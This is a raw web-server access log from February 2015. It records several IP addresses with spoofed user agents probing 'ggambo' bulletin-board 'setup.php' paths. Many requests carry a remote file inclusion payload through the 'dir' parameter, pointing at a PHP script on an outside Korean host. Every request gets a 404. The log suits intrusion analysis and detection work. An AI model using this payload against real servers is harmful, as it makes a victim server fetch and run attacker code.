1.224.163.80 - - [10/Feb/2015:08:22:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:00 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:09 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:23:11 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:23:11 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:23:13 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
1.224.163.80 - - [10/Feb/2015:08:23:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
95.168.199.227 - - [10/Feb/2015:08:23:18 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:23:19 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:23:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:08:23:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [10/Feb/2015:08:23:20 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:22 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:22 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:24 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:24 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:25 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:26 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:29 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:30 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:31 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:23:32 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:08:23:59 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:23:59 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:01 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:01 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:01 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:02 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:03 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:08:24:03 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
1.224.163.80 - - [10/Feb/2015:08:24:27 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:24:28 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:24:29 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
1.224.163.80 - - [10/Feb/2015:08:24:30 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
211.47.181.38 - - [10/Feb/2015:08:26:20 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:08:26:22 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:08:26:22 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [10/Feb/2015:08:26:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
211.47.181.38 - - [10/Feb/2015:08:26:24 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [10/Feb/2015:08:26:25 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
203.58.0.155 - - [10/Feb/2015:08:26:26 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
203.58.0.155 - - [10/Feb/2015:08:26:27 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
211.47.181.38 - - [10/Feb/2015:08:27:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:08:27:08 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:08:27:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
211.47.181.38 - - [10/Feb/2015:08:27:10 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
94.246.128.46 - - [10/Feb/2015:08:27:36 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:27:38 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:27:38 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:27:39 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
112.218.68.155 - - [10/Feb/2015:08:29:20 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:21 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:22 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:23 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:38 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:40 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:40 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:42 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:45 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:46 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:47 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:47 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:48 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:49 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:50 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [10/Feb/2015:08:29:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
1.224.163.80 - - [10/Feb/2015:08:29:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:53 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:55 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:57 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:29:57 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [10/Feb/2015:08:29:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:08:30:00 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:08:30:01 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:08:30:02 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:08:30:02 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
203.58.0.155 - - [10/Feb/2015:08:30:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:08:30:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [10/Feb/2015:08:30:03 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
203.58.0.155 - - [10/Feb/2015:08:30:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
203.58.0.155 - - [10/Feb/2015:08:30:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
112.218.68.155 - - [10/Feb/2015:08:30:06 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
203.58.0.155 - - [10/Feb/2015:08:30:06 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.8 [en] (Windows NT 5.0; U)" 
94.246.128.46 - - [10/Feb/2015:08:31:11 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:12 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:13 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:13 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:14 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:14 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:14 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
94.246.128.46 - - [10/Feb/2015:08:31:15 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:08:31:32 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:08:31:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:08:31:34 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:08:31:35 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
94.246.128.46 - - [10/Feb/2015:08:33:17 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:33:18 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:33:19 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
94.246.128.46 - - [10/Feb/2015:08:33:20 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)" 
95.168.199.227 - - [10/Feb/2015:08:34:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:34:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:34:23 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:08:34:24 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
146.0.40.55 - - [10/Feb/2015:08:36:54 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:08:36:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:08:37:00 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
146.0.40.55 - - [10/Feb/2015:08:37:02 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:08:45:16 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
